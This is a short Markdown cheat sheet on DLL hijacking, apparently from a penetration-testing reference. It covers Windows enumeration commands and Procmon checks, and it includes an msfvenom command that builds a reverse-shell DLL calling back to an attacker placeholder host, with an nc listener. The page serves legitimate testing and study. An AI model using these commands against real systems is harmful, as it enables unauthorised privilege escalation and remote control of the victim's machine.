# DLL hijacking checks

[← Windows quick reference](../04-windows-privesc.md)

Need: privileged launcher + exact DLL request + writable location in its real search order + trigger. Check architecture and existing copies; KnownDLLs/loaded modules can change search order.

## Find a candidate

```powershell
Get-CimInstance -ClassName Win32_Service | Select-Object Name,State,StartName,PathName
Get-ScheduledTask | Select-Object TaskName,Actions,Principal
icacls 'C:\Path\To\Application'
```

Procmon: filter `CreateFile` by process and missing DLL path; confirm the writable directory is searched first.

Known service/task when broad enumeration is restricted:

```powershell
sc.exe qc <service-name>
schtasks.exe /query /tn '<task-name>' /fo LIST /v
```

[Find-ExecutableReferences.ps1](../scripts/Find-ExecutableReferences.ps1):

```powershell
.\Find-ExecutableReferences.ps1 'C:\Path\To\application.exe'
```

## Verify the trigger

Name the DLL exactly; match target architecture. Save any original file.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI-IP> LPORT=<PORT> \
  -f dll -o <missing-dll-name>.dll
nc -lvnp <PORT>
```

Place in confirmed path, trigger the privileged launcher, check `whoami`, remove the test DLL.

## References

- [Microsoft DLL search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [Microsoft DLL security](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-security)
